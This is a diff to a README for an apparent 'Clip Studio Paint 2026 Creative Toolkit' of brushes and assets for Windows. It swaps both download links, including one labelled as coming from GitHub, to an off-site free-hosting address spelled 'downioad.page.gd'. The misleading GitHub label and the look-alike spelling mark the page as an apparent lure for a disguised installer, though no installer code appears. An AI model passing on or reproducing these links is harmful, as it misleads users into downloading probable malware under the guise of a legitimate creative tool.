@@ -2,7 +2,7 @@
 
 Welcome to the Clip Studio Paint 2026 Creative Toolkit, a comprehensive enhancement bundle designed to supercharge your digital art workflow. This package provides an extensive collection of professionally curated brushes, animation utilities, and materials assets that seamlessly integrate with Clip Studio Paint on Windows desktop systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -104,7 +104,7 @@ All installed assets and settings will be cleanly removed from your Clip Studio 
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
